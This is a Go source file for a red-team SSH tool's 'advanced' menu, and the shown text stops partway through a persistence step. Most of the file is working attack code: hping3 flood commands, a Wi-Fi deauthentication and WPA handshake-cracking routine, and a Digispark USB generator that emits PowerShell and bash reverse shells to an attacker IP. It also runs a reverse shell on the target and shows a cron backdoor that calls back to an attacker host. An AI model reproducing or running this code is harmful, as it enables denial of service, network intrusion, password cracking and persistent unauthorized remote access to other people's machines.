package advanced

import (
	"bufio"
	"fmt"
	"strings"
	"time"
	
	"cross-ssh/pkg/common"
	"golang.org/x/crypto/ssh"
)

// Color constants
const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Cyan   = "\033[36m"
	Bold   = "\033[1m"
)

// detectOS returns the OS type of the remote host.
func detectOS(client *ssh.Client) string {
	out, err := common.ExecuteRemoteCommand(client, "uname -s 2>/dev/null || echo 'Unknown'", common.DefaultCmdTimeout)
	if err != nil {
		return "Unknown"
	}
	return strings.TrimSpace(out)
}

// ShowRedTeamAdvancedMenu is the entry point for the advanced module.
func ShowRedTeamAdvancedMenu(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string) {
	osType := detectOS(client)
	fmt.Printf(Yellow+"Target Host: "+Reset+Bold+"%s (%s)\n"+Reset, host, osType)

	for {
		fmt.Print("\033[H\033[2J")
		fmt.Println(Red + Bold + "🔥 RED TEAM ADVANCED ENGINE" + Reset)
		fmt.Printf(Yellow+"Target Host: "+Reset+Bold+"%s (%s)\n"+Reset, host, osType)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)
		fmt.Println("  [1] 💥 Network Stress Test (DDoS Simulation)")
		fmt.Println("  [2] 🔎 Reverse Engineering Lab (Binary Analysis)")
		fmt.Println("  [3] ⚡ Local Privilege Escalation Audit")
		fmt.Println("  [4] 📶 Wi-Fi Penetration Testing (WPA Cracking)")
		fmt.Println("  [5] 🧪 Physical Attack Vectors (Digispark/Rubber Ducky)")
		fmt.Println("  [6] 🌐 DNS Enumeration (Subdomain/Zones)")
		fmt.Println("  [7] 📦 Application Dependency Security Check")
		fmt.Println("  [8] 📡 C2 Beacon & Pivoting Simulation")
		fmt.Println("  [9] ⚔️ Full Attack Chain Simulation (PrivEsc, Persistence, Creds, Exfil, Pivot)")
		fmt.Println(" [10] 📶 Bluetooth Attack Simulation (HID, Pairing, BlueBorne)")
		fmt.Println(Red + "  [0] Back" + Reset)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)

		fmt.Print(Bold + "Select Action [0-10]: " + Reset)
		input, _ := reader.ReadString('\n')
		choice := strings.TrimSpace(input)

		if choice == "0" || choice == "q" || choice == "Q" {
			return
		}

		switch choice {
		case "1":
			runDDosTest(reader, client, host, sudoPassword)
		case "2":
			runReverseEngineering(reader, client, host, sudoPassword)
		case "3":
			runPrivEscAudit(reader, client, host, sudoPassword, osType)
		case "4":
			runWifiCracking(reader, client, host, sudoPassword)
		case "5":
			generateDigisparkPayload(reader)
		case "6":
			runDNSEnumeration(reader, client, host, sudoPassword)
		case "7":
			runDependencyCheck(reader, client, host, sudoPassword, osType)
		case "8":
			runPivotingSimulation(reader, client, host, sudoPassword, osType)
		case "9":
			runFullAttackChainMenu(reader, client, host, sudoPassword, osType)
		case "10":
			runBluetoothMenu(reader, client, host, sudoPassword, osType)
		default:
			fmt.Println(Yellow + "[!] Invalid choice." + Reset)
		}
	}
}

// Helper: safe command execution with timeout and dry‑run
func runSafeCommand(client *ssh.Client, cmd string, sudoPassword string, timeout time.Duration, dryRun bool) (string, error) {
	if dryRun {
		fmt.Println(Cyan + "[DRY-RUN] Would execute: " + Reset + cmd)
		return "", nil
	}
	wrapped := wrapSudo(cmd, sudoPassword)
	return common.ExecuteRemoteCommand(client, wrapped, timeout)
}

// wrapSudo replicates the redteam package function
func wrapSudo(cmd, sudoPassword string) string {
	if sudoPassword == "" {
		return cmd
	}
	if strings.Contains(cmd, "sudo ") {
		escaped := strings.ReplaceAll(sudoPassword, "'", "'\\''")
		inner := strings.ReplaceAll(cmd, "'", "'\\''")
		return fmt.Sprintf("echo '%s' | sudo -S sh -c '%s'", escaped, inner)
	}
	return cmd
}

// ---------------------------------------------------------------------
// 1. Network Stress Test (DDoS Simulation)
// ---------------------------------------------------------------------
func runDDosTest(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string) {
	fmt.Print(Yellow + "This will send a massive flood of packets to your internal network.\nProceed? (y/n): " + Reset)
	resp, _ := reader.ReadString('\n')
	resp = strings.TrimSpace(strings.ToLower(resp))
	if resp != "y" {
		return
	}

	fmt.Print("Enter target IP (e.g., 192.168.0.1): ")
	targetIP, _ := reader.ReadString('\n')
	targetIP = strings.TrimSpace(targetIP)

	fmt.Print("Enter attack type (syn/udp/icmp) [default: syn]: ")
	attackType, _ := reader.ReadString('\n')
	attackType = strings.TrimSpace(attackType)
	if attackType == "" {
		attackType = "syn"
	}

	fmt.Print("Enter duration in seconds [default: 30]: ")
	durStr, _ := reader.ReadString('\n')
	durStr = strings.TrimSpace(durStr)
	duration := 30
	if durStr != "" {
		fmt.Sscanf(durStr, "%d", &duration)
	}

	var cmd string
	switch attackType {
	case "syn":
		cmd = fmt.Sprintf("timeout %d sudo hping3 -S --flood -p 80 %s", duration, targetIP)
	case "udp":
		cmd = fmt.Sprintf("timeout %d sudo hping3 --udp --flood -p 53 %s", duration, targetIP)
	case "icmp":
		cmd = fmt.Sprintf("timeout %d sudo hping3 -1 --flood %s", duration, targetIP)
	default:
		cmd = fmt.Sprintf("timeout %d sudo hping3 -S --flood -p 80 %s", duration, targetIP)
	}

	fmt.Println(Cyan + "[DRY-RUN] Command to execute:" + Reset)
	fmt.Println("  " + cmd)

	fmt.Print(Yellow + "Type YES to execute: " + Reset)
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(confirm)
	if confirm != "YES" {
		fmt.Println("Aborted.")
		return
	}

	fmt.Println(Cyan + "[+] Executing stress test... (this may take up to " + fmt.Sprint(duration) + " seconds)" + Reset)
	out, err := runSafeCommand(client, cmd, sudoPassword, time.Duration(duration+5)*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== STRESS TEST OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "===========================" + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 2. Reverse Engineering Lab (Binary Analysis)
// ---------------------------------------------------------------------
func runReverseEngineering(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string) {
	fmt.Println(Yellow + "[+] Reverse Engineering Lab" + Reset)
	fmt.Println("  This will run static analysis on a binary file.")
	fmt.Print("Enter full remote path to the binary (e.g., /bin/ls): ")
	binPath, _ := reader.ReadString('\n')
	binPath = strings.TrimSpace(binPath)

	fmt.Print("Do you want to check for hardcoded strings? (y/n): ")
	checkStrings, _ := reader.ReadString('\n')
	checkStrings = strings.TrimSpace(strings.ToLower(checkStrings))

	fmt.Print("Do you want to disassemble the main function? (y/n): ")
	checkDisasm, _ := reader.ReadString('\n')
	checkDisasm = strings.TrimSpace(strings.ToLower(checkDisasm))

	var cmd strings.Builder
	cmd.WriteString("echo '=== ANALYSIS ==='\n")
	if checkStrings == "y" {
		cmd.WriteString(fmt.Sprintf("strings %s | head -20\n", binPath))
	}
	if checkDisasm == "y" {
		cmd.WriteString(fmt.Sprintf("objdump -d -M intel %s | grep -E '<main>|call' | head -20\n", binPath))
	}
	if checkStrings != "y" && checkDisasm != "y" {
		cmd.WriteString(fmt.Sprintf("file %s\nldd %s 2>/dev/null || echo 'Not a dynamic executable'\n", binPath))
	}

	fmt.Println(Cyan + "[DRY-RUN] Will run the following analysis:" + Reset)
	fmt.Println(cmd.String())

	fmt.Print(Yellow + "Execute analysis? (y/n): " + Reset)
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(strings.ToLower(confirm))
	if confirm != "y" {
		return
	}

	out, err := runSafeCommand(client, cmd.String(), sudoPassword, 30*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== ANALYSIS OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "=======================" + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 3. Local Privilege Escalation Audit
// ---------------------------------------------------------------------
func runPrivEscAudit(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string, osType string) {
	if osType != "Linux" && osType != "Darwin" {
		fmt.Println(Yellow + "[!] Privilege escalation audit is only supported on Linux/macOS." + Reset)
		common.PausePrompt()
		return
	}

	fmt.Println(Yellow + "[+] Local Privilege Escalation Audit" + Reset)
	fmt.Println("  This will check for common SUID/SGID misconfigurations and known kernel vulnerabilities.")
	fmt.Print("Do you want to run a full SUID/GUID scan? (y/n): ")
	suidScan, _ := reader.ReadString('\n')
	suidScan = strings.TrimSpace(strings.ToLower(suidScan))

	fmt.Print("Do you want to check for known Linux kernel exploits (linux-exploit-suggester)? (y/n): ")
	checkKernel, _ := reader.ReadString('\n')
	checkKernel = strings.TrimSpace(strings.ToLower(checkKernel))

	var cmd strings.Builder
	if suidScan == "y" {
		cmd.WriteString("echo '=== SUID/SGID BINARIES ==='\nfind / -perm -4000 -type f 2>/dev/null | head -20\nfind / -perm -2000 -type f 2>/dev/null | head -20\n")
	}
	if checkKernel == "y" {
		cmd.WriteString("echo '=== KERNEL VULNERABILITIES ==='\n")
		cmd.WriteString(`if command -v linux-exploit-suggester >/dev/null 2>&1; then
			linux-exploit-suggester --checksec 2>/dev/null | head -30
		else
			echo "linux-exploit-suggester not installed. Falling back to uname -a:"
			uname -a
			echo "Check https://github.com/mzet-/linux-exploit-suggester for manual installation."
		fi`)
	}
	if suidScan != "y" && checkKernel != "y" {
		fmt.Println(Yellow + "[!] No checks selected." + Reset)
		return
	}

	fmt.Println(Cyan + "[DRY-RUN] Will run:" + Reset)
	fmt.Println(cmd.String())

	fmt.Print(Yellow + "Execute audit? (y/n): " + Reset)
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(strings.ToLower(confirm))
	if confirm != "y" {
		return
	}

	out, err := runSafeCommand(client, cmd.String(), sudoPassword, 60*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== AUDIT OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "===================" + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 4. Wi-Fi Penetration Testing (WPA Cracking)
// ---------------------------------------------------------------------
func runWifiCracking(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string) {
	fmt.Println(Yellow + "[+] Wi-Fi Penetration Testing" + Reset)
	fmt.Println("  This requires a compatible wireless adapter in monitor mode on the target host.")
	fmt.Print("Check if a wireless interface exists? (y/n): ")
	checkIntf, _ := reader.ReadString('\n')
	checkIntf = strings.TrimSpace(strings.ToLower(checkIntf))

	if checkIntf != "y" {
		fmt.Println("Skipping interface check. Continuing anyway...")
	}

	cmdCheck := "iwconfig 2>/dev/null | grep -E '^[a-zA-Z0-9]+' | awk '{print $1}'"
	out, _ := runSafeCommand(client, cmdCheck, sudoPassword, 10*time.Second, false)
	if strings.TrimSpace(out) == "" {
		fmt.Println(Yellow + "[!] No wireless interface found. Aborting." + Reset)
		common.PausePrompt()
		return
	}
	fmt.Println("Detected interface(s):\n" + out)

	fmt.Print("Enter the interface to use (e.g., wlan0): ")
	iface, _ := reader.ReadString('\n')
	iface = strings.TrimSpace(iface)

	fmt.Print("Do you want to put it into monitor mode? (y/n): ")
	monitor, _ := reader.ReadString('\n')
	monitor = strings.TrimSpace(strings.ToLower(monitor))

	if monitor == "y" {
		cmdMon := fmt.Sprintf("sudo airmon-ng start %s", iface)
		fmt.Println(Cyan + "[DRY-RUN] " + cmdMon + Reset)
		fmt.Print("Execute? (y/n): ")
		execMon, _ := reader.ReadString('\n')
		execMon = strings.TrimSpace(strings.ToLower(execMon))
		if execMon == "y" {
			_, _ = runSafeCommand(client, cmdMon, sudoPassword, 10*time.Second, false)
			iface = iface + "mon"
			fmt.Println(Green + "[+] Interface set to monitor mode: " + iface + Reset)
		} else {
			fmt.Println("Monitor mode not enabled.")
		}
	}

	fmt.Println(Yellow + "[+] Starting airodump to scan networks (30 seconds)...")
	cmdScan := fmt.Sprintf("timeout 30 sudo airodump-ng %s --write /tmp/wifi_scan --output-format csv 2>/dev/null", iface)
	fmt.Println(Cyan + "[DRY-RUN] " + cmdScan + Reset)
	fmt.Print("Start scan? (y/n): ")
	startScan, _ := reader.ReadString('\n')
	startScan = strings.TrimSpace(strings.ToLower(startScan))
	if startScan != "y" {
		return
	}
	_, _ = runSafeCommand(client, cmdScan, sudoPassword, 35*time.Second, false)

	fmt.Println("Scan completed. Showing available networks:")
	cmdShow := "grep -E '^[0-9A-F]{2}:' /tmp/wifi_scan-01.csv 2>/dev/null | head -20"
	out, _ = runSafeCommand(client, cmdShow, sudoPassword, 10*time.Second, false)
	fmt.Println(out)

	fmt.Print("Enter BSSID of target network (MAC): ")
	bssid, _ := reader.ReadString('\n')
	bssid = strings.TrimSpace(bssid)
	fmt.Print("Enter channel of target: ")
	channel, _ := reader.ReadString('\n')
	channel = strings.TrimSpace(channel)

	fmt.Println(Yellow + "[+] Attempting to capture WPA handshake (de-auth will be sent)...")
	cmdCapture := fmt.Sprintf("timeout 60 sudo airodump-ng --bssid %s --channel %s --write /tmp/handshake %s 2>/dev/null &", bssid, channel, iface)
	cmdDeauth := fmt.Sprintf("sudo aireplay-ng --deauth 5 -a %s %s 2>/dev/null", bssid, iface)

	fmt.Println(Cyan + "[DRY-RUN] Capture: " + cmdCapture + Reset)
	fmt.Println(Cyan + "[DRY-RUN] Deauth: " + cmdDeauth + Reset)
	fmt.Print("Execute handshake capture? (y/n): ")
	execCap, _ := reader.ReadString('\n')
	execCap = strings.TrimSpace(strings.ToLower(execCap))
	if execCap != "y" {
		return
	}
	go func() {
		_, _ = runSafeCommand(client, cmdCapture, sudoPassword, 60*time.Second, false)
	}()
	time.Sleep(5 * time.Second)
	_, _ = runSafeCommand(client, cmdDeauth, sudoPassword, 10*time.Second, false)
	time.Sleep(30 * time.Second)

	fmt.Println("Handshake capture completed. Checking for .cap file...")
	cmdCheckCap := "ls -l /tmp/handshake-01.cap 2>/dev/null || echo 'No capture file found'"
	out, _ = runSafeCommand(client, cmdCheckCap, sudoPassword, 10*time.Second, false)
	fmt.Println(out)

	if strings.Contains(out, "No capture file found") {
		fmt.Println(Yellow + "[!] No handshake captured. Try again or use a different target." + Reset)
		common.PausePrompt()
		return
	}

	fmt.Print("Do you want to attempt cracking the handshake with rockyou.txt? (y/n): ")
	crack, _ := reader.ReadString('\n')
	crack = strings.TrimSpace(strings.ToLower(crack))
	if crack == "y" {
		wordlist := "/usr/share/wordlists/rockyou.txt"
		cmdCrack := fmt.Sprintf("sudo aircrack-ng -a2 -b %s -w %s /tmp/handshake-01.cap 2>/dev/null | grep -E 'KEY FOUND|Passphrase'", bssid, wordlist)
		fmt.Println(Cyan + "[DRY-RUN] " + cmdCrack + Reset)
		fmt.Print("Execute cracking? (y/n): ")
		execCrack, _ := reader.ReadString('\n')
		execCrack = strings.TrimSpace(strings.ToLower(execCrack))
		if execCrack == "y" {
			out, _ := runSafeCommand(client, cmdCrack, sudoPassword, 5*time.Minute, false)
			fmt.Println(Blue + "=== CRACKING RESULT ===" + Reset)
			fmt.Println(out)
			fmt.Println(Blue + "=======================" + Reset)
		}
	}
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 5. Physical Attack Vectors (Digispark Payload Generator)
// ---------------------------------------------------------------------
func generateDigisparkPayload(reader *bufio.Reader) {
	fmt.Println(Cyan + "[+] Digispark USB Payload Generator" + Reset)
	fmt.Println("Which OS will the target PC be running?")
	fmt.Println("  [1] Windows")
	fmt.Println("  [2] Linux")
	fmt.Println("  [3] macOS")
	fmt.Print("Select [1-3]: ")
	osChoice, _ := reader.ReadString('\n')
	osChoice = strings.TrimSpace(osChoice)

	fmt.Print("Enter your attacker IP address (e.g., 192.168.0.100): ")
	attackerIP, _ := reader.ReadString('\n')
	attackerIP = strings.TrimSpace(attackerIP)

	fmt.Print("Enter the port for the reverse shell (e.g., 4444): ")
	attackerPort, _ := reader.ReadString('\n')
	attackerPort = strings.TrimSpace(attackerPort)

	var payload string
	switch osChoice {
	case "1": // Windows
		payload = fmt.Sprintf(`#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}`, attackerIP, attackerPort)
	case "2": // Linux
		payload = fmt.Sprintf(`#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Alt+F2 (or Ctrl+Alt+T on some)
  DigiKeyboard.delay(500);
  DigiKeyboard.print("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}`, attackerIP, attackerPort)
	case "3": // macOS
		payload = fmt.Sprintf(`#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Spotlight (Cmd+Space)
  DigiKeyboard.delay(500);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}`, attackerIP, attackerPort)
	default:
		fmt.Println(Yellow + "[!] Invalid OS choice." + Reset)
		return
	}

	fmt.Println(Green + "\n[✔] Payload Generated! Copy the following code into your Arduino IDE:" + Reset)
	fmt.Println(Yellow + "=============================================================" + Reset)
	fmt.Println(payload)
	fmt.Println(Yellow + "=============================================================" + Reset)
	fmt.Println(Cyan + "Instructions: Compile and upload this to your Digispark, then plug it into the target machine." + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 6. DNS Enumeration
// ---------------------------------------------------------------------
func runDNSEnumeration(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string) {
	fmt.Println(Yellow + "[+] DNS Enumeration" + Reset)
	fmt.Print("Enter domain to enumerate (e.g., example.com): ")
	domain, _ := reader.ReadString('\n')
	domain = strings.TrimSpace(domain)

	fmt.Print("Do you want to attempt zone transfer? (y/n): ")
	zoneTransfer, _ := reader.ReadString('\n')
	zoneTransfer = strings.TrimSpace(strings.ToLower(zoneTransfer))

	var cmd strings.Builder
	if zoneTransfer == "y" {
		cmd.WriteString(fmt.Sprintf("dig axfr @$(dig +short NS %s | head -1) %s 2>/dev/null || echo 'Zone transfer failed or not allowed'\n", domain, domain))
	}
	cmd.WriteString(fmt.Sprintf("dig +short A %s\n", domain))
	cmd.WriteString(fmt.Sprintf("dig +short MX %s\n", domain))
	cmd.WriteString(fmt.Sprintf("dig +short NS %s\n", domain))

	fmt.Println(Cyan + "[DRY-RUN] Will execute:" + Reset)
	fmt.Println(cmd.String())

	fmt.Print("Execute enumeration? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(strings.ToLower(confirm))
	if confirm != "y" {
		return
	}

	out, err := runSafeCommand(client, cmd.String(), sudoPassword, 30*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== DNS ENUMERATION OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "==============================" + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 7. Application Dependency Security Check
// ---------------------------------------------------------------------
func runDependencyCheck(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string, osType string) {
	fmt.Println(Yellow + "[+] Application Dependency Security Check" + Reset)
	fmt.Println("  This will check for known vulnerabilities in installed dependencies.")
	fmt.Print("Enter the path to the project directory (e.g., /home/user/myapp): ")
	projectPath, _ := reader.ReadString('\n')
	projectPath = strings.TrimSpace(projectPath)

	var cmd strings.Builder
	if osType == "Linux" || osType == "Darwin" {
		cmd.WriteString(fmt.Sprintf("cd %s 2>/dev/null || echo 'Directory not found'\n", projectPath))
		cmd.WriteString(`if [ -f package.json ]; then
  if command -v npm >/dev/null 2>&1; then
    npm audit --json | head -30 2>/dev/null || echo 'npm audit failed'
  else
    echo 'npm not installed'
  fi
fi
if [ -f requirements.txt ]; then
  if command -v safety >/dev/null 2>&1; then
    safety check -r requirements.txt --short 2>/dev/null | head -30 || echo 'safety check failed'
  else
    echo 'safety not installed'
  fi
fi
if [ -f go.mod ]; then
  if command -v govulncheck >/dev/null 2>&1; then
    govulncheck ./... 2>/dev/null | head -30 || echo 'govulncheck failed'
  else
    echo 'govulncheck not installed'
  fi
fi`)
	} else {
		cmd.WriteString(fmt.Sprintf("cd %s 2>nul || echo 'Directory not found'\n", projectPath))
		cmd.WriteString(`if exist package.json (
  where npm >nul 2>nul && npm audit --json | findstr /i "vulnerability" || echo 'npm audit failed or not installed'
)
if exist requirements.txt (
  echo 'Safety check not supported on Windows'
)
if exist go.mod (
  echo 'govulncheck not supported on Windows'
)`)
	}

	fmt.Println(Cyan + "[DRY-RUN] Will execute:" + Reset)
	fmt.Println(cmd.String())

	fmt.Print("Execute dependency check? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(strings.ToLower(confirm))
	if confirm != "y" {
		return
	}

	out, err := runSafeCommand(client, cmd.String(), sudoPassword, 60*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== DEPENDENCY CHECK OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "==============================" + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 8. C2 Beacon & Pivoting Simulation
// ---------------------------------------------------------------------
func runPivotingSimulation(reader *bufio.Reader, client *ssh.Client, host, sudoPassword string, osType string) {
	fmt.Println(Yellow + "[+] C2 Beacon & Pivoting Simulation" + Reset)
	fmt.Println("  This will demonstrate how an attacker could establish persistence and pivot.")
	fmt.Print("Do you want to simulate a reverse shell callback (listens on your attacker machine)? (y/n): ")
	beacon, _ := reader.ReadString('\n')
	beacon = strings.TrimSpace(strings.ToLower(beacon))

	if beacon == "y" {
		fmt.Print("Enter your listener IP (attacker machine): ")
		listenerIP, _ := reader.ReadString('\n')
		listenerIP = strings.TrimSpace(listenerIP)
		fmt.Print("Enter your listener port: ")
		listenerPort, _ := reader.ReadString('\n')
		listenerPort = strings.TrimSpace(listenerPort)

		var cmd string
		if osType == "Windows" {
			cmd = fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", listenerIP, listenerPort)
		} else {
			cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", listenerIP, listenerPort)
		}
		fmt.Println(Cyan + "[DRY-RUN] Would execute (on target): " + cmd + Reset)
		fmt.Println(Yellow + "NOTE: This is a real reverse shell. Ensure your listener is ready (e.g., `nc -lvnp <port>`)." + Reset)
		fmt.Print("Execute the reverse shell? (y/n): ")
		execShell, _ := reader.ReadString('\n')
		execShell = strings.TrimSpace(strings.ToLower(execShell))
		if execShell == "y" {
			go func() {
				_, _ = runSafeCommand(client, cmd, sudoPassword, 30*time.Second, false)
			}()
			fmt.Println(Green + "[+] Reverse shell executed. Check your listener." + Reset)
			common.PausePrompt()
			return
		}
	}

	fmt.Print("Do you want to simulate SSH tunnel pivoting (local port forwarding)? (y/n): ")
	pivot, _ := reader.ReadString('\n')
	pivot = strings.TrimSpace(strings.ToLower(pivot))
	if pivot == "y" {
		fmt.Print("Enter remote host to reach via pivot (e.g., 192.168.1.100): ")
		remoteHost, _ := reader.ReadString('\n')
		remoteHost = strings.TrimSpace(remoteHost)
		fmt.Print("Enter remote port: ")
		remotePort, _ := reader.ReadString('\n')
		remotePort = strings.TrimSpace(remotePort)
		fmt.Print("Enter local port to forward (on your attacker machine): ")
		localPort, _ := reader.ReadString('\n')
		localPort = strings.TrimSpace(localPort)

		cmd := fmt.Sprintf("ssh -L %s:%s:%s localhost -Nf", localPort, remoteHost, remotePort)
		fmt.Println(Cyan + "[DRY-RUN] Would execute (on attacker): " + cmd + Reset)
		fmt.Print("Execute SSH tunnel? (requires SSH key setup) (y/n): ")
		execTunnel, _ := reader.ReadString('\n')
		execTunnel = strings.TrimSpace(strings.ToLower(execTunnel))
		if execTunnel == "y" {
			fmt.Println(Yellow + "[!] SSH tunnel should be run on your attacker machine, not the target. We'll skip this." + Reset)
		}
	}
	fmt.Println(Yellow + "Simulation complete." + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 9. Full Attack Chain Simulation
// ---------------------------------------------------------------------
func runFullAttackChainMenu(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	for {
		fmt.Print("\033[H\033[2J")
		fmt.Println(Red + Bold + "⚔️ FULL ATTACK CHAIN SIMULATION" + Reset)
		fmt.Printf(Yellow+"Target: "+Reset+Bold+"%s (%s)\n"+Reset, host, osType)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)
		fmt.Println("  [1] 🔓 Privilege Escalation (find root/system paths)")
		fmt.Println("  [2] 🧬 Install Persistent Backdoor (cron/systemd/schtasks)")
		fmt.Println("  [3] 🔑 Steal Credentials (dump hashes/tokens)")
		fmt.Println("  [4] 📤 Exfiltrate Sensitive Data (simulate exfil)")
		fmt.Println("  [5] 🔗 Pivot to Internal Network (SSH tunneling)")
		fmt.Println("  [6] ▶️ Run All Steps Sequentially")
		fmt.Println(Red + "  [0] Back" + Reset)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)

		fmt.Print(Bold + "Select step [0-6]: " + Reset)
		input, _ := reader.ReadString('\n')
		choice := strings.TrimSpace(input)

		if choice == "0" || choice == "q" || choice == "Q" {
			return
		}

		switch choice {
		case "1":
			runPrivEscStep(reader, client, host, sudoPassword, osType)
		case "2":
			runPersistenceStep(reader, client, host, sudoPassword, osType)
		case "3":
			runCredentialStep(reader, client, host, sudoPassword, osType)
		case "4":
			runExfilStep(reader, client, host, sudoPassword, osType)
		case "5":
			runPivotStep(reader, client, host, sudoPassword, osType)
		case "6":
			runFullChainSequential(reader, client, host, sudoPassword, osType)
		default:
			fmt.Println(Yellow + "[!] Invalid choice." + Reset)
		}
	}
}

// Step 1: Privilege Escalation
func runPrivEscStep(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "[+] Privilege Escalation Audit" + Reset)
	fmt.Println("  This step detects common escalation vectors.")
	var cmd string
	if osType == "Linux" || osType == "Darwin" {
		cmd = `echo "=== SUDO RIGHTS ==="; sudo -l 2>/dev/null || echo "No sudo rights"
echo "=== SUID BINARIES ==="; find / -perm -4000 -type f 2>/dev/null | head -20
echo "=== KERNEL EXPLOITS ==="; if command -v linux-exploit-suggester >/dev/null; then linux-exploit-suggester --checksec 2>/dev/null | head -20; else echo "linux-exploit-suggester not installed"; fi`
	} else {
		cmd = `whoami /priv
wmic service list brief | findstr "Running"
sc query`
	}
	fmt.Println(Cyan + "[DRY-RUN] Command:" + Reset)
	fmt.Println(cmd)
	fmt.Print(Yellow + "Execute? (y/n): " + Reset)
	confirm, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
		return
	}
	out, err := runSafeCommand(client, cmd, sudoPassword, 30*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== OUTPUT ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "=============" + Reset)
	common.PausePrompt()
}

// Step 2: Persistence (cron/systemd/schtasks)
func runPersistenceStep(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "[+] Persistent Backdoor Installation (Simulation)" + Reset)
	fmt.Println("  This step shows how an attacker would install a persistence mechanism.")
	fmt.Println("  No actual backdoor is installed; only the commands are shown.")
	if osType == "Linux" || osType == "Darwin" {
		fmt.Println("  For Linux/macOS, typical methods: cron job, systemd timer, or .bashrc.")
		fmt.Println("  Example: `(crontab -l 2>/dev/null; echo '*/5 * * * * bash -c \"bash -i >& /dev/tcp/attacker_ip/4444 0>&1\"') | crontab -`")
	} else {
